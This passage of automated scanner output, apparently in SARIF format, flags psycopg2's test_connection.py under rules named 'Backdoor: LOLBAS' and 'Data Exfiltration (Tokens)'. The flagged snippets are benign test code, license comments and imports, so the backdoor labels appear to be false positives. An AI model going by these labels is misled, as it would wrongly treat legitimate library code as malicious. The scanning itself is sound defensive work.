                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 48,
                  "endLine": 251,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        self.assertEqual(cur.fetchone()[0], 'foo')\n\n    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n",
                    "rendered": {
                      "text": "        self.assertEqual(cur.fetchone()[0], 'foo')\n\n    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n",
                      "markdown": "`        self.assertEqual(cur.fetchone()[0], 'foo')\n\n    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1737,
                  "startColumn": 6,
                  "endLine": 1738,
                  "snippet": {
                    "text": "    def _test_bug_551(self, query):\n        script = f\"\"\"import os\nimport sys\nimport time\nimport signal\nimport warnings\nimport threading\n\n",
                    "rendered": {
                      "text": "    def _test_bug_551(self, query):\n        script = f\"\"\"import os\nimport sys\nimport time\nimport signal\nimport warnings\nimport threading\n\n",
                      "markdown": "`    def _test_bug_551(self, query):\n        script = f\"\"\"import os\nimport sys\nimport time\nimport signal\nimport warnings\nimport threading\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1735,
                  "startColumn": 7,
                  "endLine": 1735,
                  "endColumn": 15,
                  "snippet": {
                    "text": "            \"\"\")\n\n    def _test_bug_551(self, query):\n        script = f\"\"\"import os\nimport sys\nimport time\nimport signal\n",
                    "rendered": {
                      "text": "            \"\"\")\n\n    def _test_bug_551(self, query):\n        script = f\"\"\"import os\nimport sys\nimport time\nimport signal\n",
                      "markdown": "`            \"\"\")\n\n    def _test_bug_551(self, query):\n        script = f\"\"\"import os\nimport sys\nimport time\nimport signal\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1239,
                  "startColumn": 18,
                  "endLine": 1239,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        self.assertEqual('code', xid.bqual)\n\n    def test_xid_unicode_unparsed(self):\n        # We don't expect people shooting snowmen as transaction ids,\n        # so if something explodes in an encode error I don't mind.\n        # Let's just check unicode is accepted as type.\n        cnn = self.connect()\n",
                    "rendered": {
                      "text": "        self.assertEqual('code', xid.bqual)\n\n    def test_xid_unicode_unparsed(self):\n        # We don't expect people shooting snowmen as transaction ids,\n        # so if something explodes in an encode error I don't mind.\n        # Let's just check unicode is accepted as type.\n        cnn = self.connect()\n",
                      "markdown": "`        self.assertEqual('code', xid.bqual)\n\n    def test_xid_unicode_unparsed(self):\n        # We don't expect people shooting snowmen as transaction ids,\n        # so if something explodes in an encode error I don't mind.\n        # Let's just check unicode is accepted as type.\n        cnn = self.connect()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 613,
                  "startColumn": 54,
                  "endLine": 613,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        for name, level in levels:\n            conn.set_isolation_level(level)\n\n            # the only values available on prehistoric PG versions\n            if conn.info.server_version < 80000:\n                if level in (\n                        ext.ISOLATION_LEVEL_READ_UNCOMMITTED,\n",
                    "rendered": {
                      "text": "        for name, level in levels:\n            conn.set_isolation_level(level)\n\n            # the only values available on prehistoric PG versions\n            if conn.info.server_version < 80000:\n                if level in (\n                        ext.ISOLATION_LEVEL_READ_UNCOMMITTED,\n",
                      "markdown": "`        for name, level in levels:\n            conn.set_isolation_level(level)\n\n            # the only values available on prehistoric PG versions\n            if conn.info.server_version < 80000:\n                if level in (\n                        ext.ISOLATION_LEVEL_READ_UNCOMMITTED,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 403,
                  "startColumn": 6,
                  "endLine": 404,
                  "snippet": {
                    "text": "            script = (\"\"\"\\\nimport sys\nsys.path.insert(0, {dir!r})\nimport time\nimport threading\nimport multiprocessing\nimport mptest\n\n",
                    "rendered": {
                      "text": "            script = (\"\"\"\\\nimport sys\nsys.path.insert(0, {dir!r})\nimport time\nimport threading\nimport multiprocessing\nimport mptest\n\n",
                      "markdown": "`            script = (\"\"\"\\\nimport sys\nsys.path.insert(0, {dir!r})\nimport time\nimport threading\nimport multiprocessing\nimport mptest\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 400,
                  "startColumn": 11,
                  "endLine": 400,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    time.sleep(0.2)\n\"\"\")\n\n            script = (\"\"\"\\\nimport sys\nsys.path.insert(0, {dir!r})\nimport time\n",
                    "rendered": {
                      "text": "    time.sleep(0.2)\n\"\"\")\n\n            script = (\"\"\"\\\nimport sys\nsys.path.insert(0, {dir!r})\nimport time\n",
                      "markdown": "`    time.sleep(0.2)\n\"\"\")\n\n            script = (\"\"\"\\\nimport sys\nsys.path.insert(0, {dir!r})\nimport time\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 386,
                  "startColumn": 34,
                  "endLine": 387,
                  "snippet": {
                    "text": "        dir = tempfile.mkdtemp()\n        try:\n            with open(os.path.join(dir, \"mptest.py\"), 'w') as f:\n                f.write(f\"\"\"import time\nimport psycopg2\n\ndef thread():\n    conn = psycopg2.connect({dsn!r})\n",
                    "rendered": {
                      "text": "        dir = tempfile.mkdtemp()\n        try:\n            with open(os.path.join(dir, \"mptest.py\"), 'w') as f:\n                f.write(f\"\"\"import time\nimport psycopg2\n\ndef thread():\n    conn = psycopg2.connect({dsn!r})\n",
                      "markdown": "`        dir = tempfile.mkdtemp()\n        try:\n            with open(os.path.join(dir, \"mptest.py\"), 'w') as f:\n                f.write(f\"\"\"import time\nimport psycopg2\n\ndef thread():\n    conn = psycopg2.connect({dsn!r})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 62,
                  "endLine": 252,
                  "snippet": {
                    "text": "        self.assertEqual(cur.fetchone()[0], 'foo')\n\n    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n",
                    "rendered": {
                      "text": "        self.assertEqual(cur.fetchone()[0], 'foo')\n\n    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n",
                      "markdown": "`        self.assertEqual(cur.fetchone()[0], 'foo')\n\n    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 6,
                  "endLine": 31,
                  "snippet": {
                    "text": "import os\nimport re\nimport sys\nimport time\nimport ctypes\nimport shutil\nimport tempfile\nimport threading\n",
                    "rendered": {
                      "text": "import os\nimport re\nimport sys\nimport time\nimport ctypes\nimport shutil\nimport tempfile\nimport threading\n",
                      "markdown": "`import os\nimport re\nimport sys\nimport time\nimport ctypes\nimport shutil\nimport tempfile\nimport threading\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 27,
                  "endLine": 253,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n",
                    "rendered": {
                      "text": "    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n",
                      "markdown": "`    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1906,
                  "startColumn": 43,
                  "endLine": 1906,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n    @skip_before_libpq(9, 5)\n    def test_ssl_in_use(self):\n",
                    "rendered": {
                      "text": "\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n    @skip_before_libpq(9, 5)\n    def test_ssl_in_use(self):\n",
                      "markdown": "`\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n    @skip_before_libpq(9, 5)\n    def test_ssl_in_use(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1905,
                  "startColumn": 50,
                  "endLine": 1905,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n    @skip_before_libpq(9, 5)\n",
                    "rendered": {
                      "text": "        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n    @skip_before_libpq(9, 5)\n",
                      "markdown": "`        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n    @skip_before_libpq(9, 5)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 18,
                  "endLine": 1904,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n",
                    "rendered": {
                      "text": "        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n",
                      "markdown": "`        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n        self.assertIs(self.bconn.info.used_password, False)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1902,
                  "startColumn": 44,
                  "endLine": 1902,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n",
                    "rendered": {
                      "text": "\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n",
                      "markdown": "`\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n        self.assertIsInstance(self.conn.info.used_password, bool)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1901,
                  "startColumn": 43,
                  "endLine": 1901,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        self.assert_(self.bconn.info.backend_pid == 0)\n\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n",
                    "rendered": {
                      "text": "        self.assert_(self.bconn.info.backend_pid == 0)\n\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n",
                      "markdown": "`        self.assert_(self.bconn.info.backend_pid == 0)\n\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n    def test_used_password(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1900,
                  "startColumn": 19,
                  "endLine": 1900,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n        self.assert_(self.bconn.info.backend_pid == 0)\n\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n",
                    "rendered": {
                      "text": "\n        self.assert_(self.bconn.info.backend_pid == 0)\n\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n",
                      "markdown": "`\n        self.assert_(self.bconn.info.backend_pid == 0)\n\n    def test_needs_password(self):\n        self.assertIs(self.conn.info.needs_password, False)\n        self.assertIs(self.bconn.info.needs_password, False)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1827,
                  "startColumn": 22,
                  "endLine": 1827,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        d = self.conn.info.dsn_parameters\n        self.assert_(isinstance(d, dict))\n        self.assertEqual(d['dbname'], dbname)  # the only param we can check reliably\n        self.assert_('password' not in d, d)\n\n    def test_status(self):\n        self.assertEqual(self.conn.info.status, 0)\n",
                    "rendered": {
                      "text": "        d = self.conn.info.dsn_parameters\n        self.assert_(isinstance(d, dict))\n        self.assertEqual(d['dbname'], dbname)  # the only param we can check reliably\n        self.assert_('password' not in d, d)\n\n    def test_status(self):\n        self.assertEqual(self.conn.info.status, 0)\n",
                      "markdown": "`        d = self.conn.info.dsn_parameters\n        self.assert_(isinstance(d, dict))\n        self.assertEqual(d['dbname'], dbname)  # the only param we can check reliably\n        self.assert_('password' not in d, d)\n\n    def test_status(self):\n        self.assertEqual(self.conn.info.status, 0)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1803,
                  "startColumn": 37,
                  "endLine": 1803,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n    def test_host(self):\n        expected = dbhost if dbhost else \"/\"\n",
                    "rendered": {
                      "text": "\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n    def test_host(self):\n        expected = dbhost if dbhost else \"/\"\n",
                      "markdown": "`\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n    def test_host(self):\n        expected = dbhost if dbhost else \"/\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1802,
                  "startColumn": 47,
                  "endLine": 1802,
                  "endColumn": 55,
                  "snippet": {
                    "text": "        self.assert_(self.bconn.info.user is None)\n\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n    def test_host(self):\n",
                    "rendered": {
                      "text": "        self.assert_(self.bconn.info.user is None)\n\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n    def test_host(self):\n",
                      "markdown": "`        self.assert_(self.bconn.info.user is None)\n\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n    def test_host(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1801,
                  "startColumn": 13,
                  "endLine": 1801,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        self.assertEqual(self.conn.info.user, cur.fetchone()[0])\n        self.assert_(self.bconn.info.user is None)\n\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n",
                    "rendered": {
                      "text": "        self.assertEqual(self.conn.info.user, cur.fetchone()[0])\n        self.assert_(self.bconn.info.user is None)\n\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n",
                      "markdown": "`        self.assertEqual(self.conn.info.user, cur.fetchone()[0])\n        self.assert_(self.bconn.info.user is None)\n\n    def test_password(self):\n        self.assert_(isinstance(self.conn.info.password, str))\n        self.assert_(self.bconn.info.password is None)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1715,
                  "startColumn": 26,
                  "endLine": 1715,
                  "endColumn": 34,
                  "snippet": {
